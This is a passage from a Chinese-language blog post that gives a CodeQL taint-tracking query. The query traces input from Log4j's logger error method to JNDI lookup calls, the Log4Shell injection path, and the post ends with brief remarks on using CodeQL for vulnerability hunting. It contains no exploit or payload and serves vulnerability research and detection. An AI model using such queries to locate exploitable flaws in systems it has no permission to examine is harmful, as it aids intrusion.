class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@name</span> Tainttrack Context lookup</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Context</span> <span class="keyword">extends</span>  <span class="title">RefType</span></span>&#123;</span><br><span class="line">    Context()&#123;</span><br><span class="line">        <span class="keyword">this</span>.hasQualifiedName(<span class="string">&quot;javax.naming&quot;</span>, <span class="string">&quot;Context&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="keyword">this</span>.hasQualifiedName(<span class="string">&quot;javax.naming&quot;</span>, <span class="string">&quot;InitialContext&quot;</span>)</span><br><span class="line"></span><br><span class="line">        or</span><br><span class="line">        <span class="keyword">this</span>.hasQualifiedName(<span class="string">&quot;org.springframework.jndi&quot;</span>, <span class="string">&quot;JndiCallback&quot;</span>)</span><br><span class="line">        or </span><br><span class="line">        <span class="keyword">this</span>.hasQualifiedName(<span class="string">&quot;org.springframework.jndi&quot;</span>, <span class="string">&quot;JndiTemplate&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="keyword">this</span>.hasQualifiedName(<span class="string">&quot;org.springframework.jndi&quot;</span>, <span class="string">&quot;JndiLocatorDelegate&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="keyword">this</span>.hasQualifiedName(<span class="string">&quot;org.apache.shiro.jndi&quot;</span>, <span class="string">&quot;JndiCallback&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="keyword">this</span>.getQualifiedName().matches(<span class="string">&quot;%JndiCallback&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="keyword">this</span>.getQualifiedName().matches(<span class="string">&quot;%JndiLocatorDelegate&quot;</span>)</span><br><span class="line">        or</span><br><span class="line">        <span class="keyword">this</span>.getQualifiedName().matches(<span class="string">&quot;%JndiTemplate&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> <span class="keyword">extends</span>  <span class="title">RefType</span></span>&#123;</span><br><span class="line">    Logger()&#123;</span><br><span class="line">        <span class="keyword">this</span>.hasQualifiedName(<span class="string">&quot;org.apache.logging.log4j.spi&quot;</span>, <span class="string">&quot;AbstractLogger&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoggerInput</span> <span class="keyword">extends</span>  <span class="title">Method</span> </span>&#123;</span><br><span class="line">    LoggerInput()&#123;</span><br><span class="line">        <span class="keyword">this</span>.getDeclaringType() <span class="keyword">instanceof</span> Logger and</span><br><span class="line">        <span class="keyword">this</span>.hasName(<span class="string">&quot;error&quot;</span>) and <span class="keyword">this</span>.getNumberOfParameters() = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Parameter <span class="title">getAnUntrustedParameter</span><span class="params">()</span> </span>&#123; result = <span class="keyword">this</span>.getParameter(<span class="number">0</span>) &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">predicate <span class="title">isLookup</span><span class="params">(Expr arg)</span> </span>&#123;</span><br><span class="line">    exists(MethodAccess ma |</span><br><span class="line">        ma.getMethod().getName() = <span class="string">&quot;lookup&quot;</span></span><br><span class="line">        and</span><br><span class="line">        ma.getMethod().getDeclaringType() <span class="keyword">instanceof</span> Context</span><br><span class="line">        and</span><br><span class="line">        arg = ma.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TainttrackLookup</span>  <span class="keyword">extends</span> <span class="title">TaintTracking</span>::<span class="title">Configuration</span> </span>&#123;</span><br><span class="line">    TainttrackLookup() &#123; </span><br><span class="line">        <span class="keyword">this</span> = <span class="string">&quot;TainttrackLookup&quot;</span> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node source)</span> </span>&#123;</span><br><span class="line">        exists(LoggerInput LoggerMethod |</span><br><span class="line">            source.asParameter() = LoggerMethod.getAnUntrustedParameter())</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">override predicate <span class="title">isAdditionalTaintStep</span><span class="params">(DataFlow::Node fromNode, DataFlow::Node toNode)</span> </span>&#123;</span><br><span class="line">        exists(MethodAccess ma,MethodAccess ma2 |</span><br><span class="line">            ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;org.apache.logging.log4j.core.impl&quot;</span>, <span class="string">&quot;ReusableLogEventFactory&quot;</span>) </span><br><span class="line">            and ma.getMethod().hasName(<span class="string">&quot;createEvent&quot;</span>) and fromNode.asExpr()=ma.getArgument(<span class="number">5</span>) and ma2.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;org.apache.logging.log4j.core.config&quot;</span>, <span class="string">&quot;LoggerConfig&quot;</span>)  </span><br><span class="line">            and ma2.getMethod().hasName(<span class="string">&quot;log&quot;</span>) and ma2.getMethod().getNumberOfParameters() = <span class="number">2</span> and toNode.asExpr()=ma2.getArgument(<span class="number">0</span>)</span><br><span class="line">                    )</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123;</span><br><span class="line">        exists(Expr arg |</span><br><span class="line">            isLookup(arg)</span><br><span class="line">            and</span><br><span class="line">            sink.asExpr() = arg</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">from TainttrackLookup config , DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where</span><br><span class="line">    config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, <span class="string">&quot;unsafe lookup&quot;</span>, source.getNode(), <span class="string">&quot;this is user input&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    通过CodeQL挖洞效率确实比较高，并且在官方也给出了针对很多类型漏洞的审计规则，确实可以高效的辅助挖洞，目前主要解决下面两个问题。</p>
<ul>
<li><p>默认的Source应该只是针对HTTP请求，如何针对特定的框架去发现可能作为source的点</p>
</li>
<li><p>分析污点在何时会被打断并进行拼接</p>
</li>
</ul>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/CodeQL/">CodeQL</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>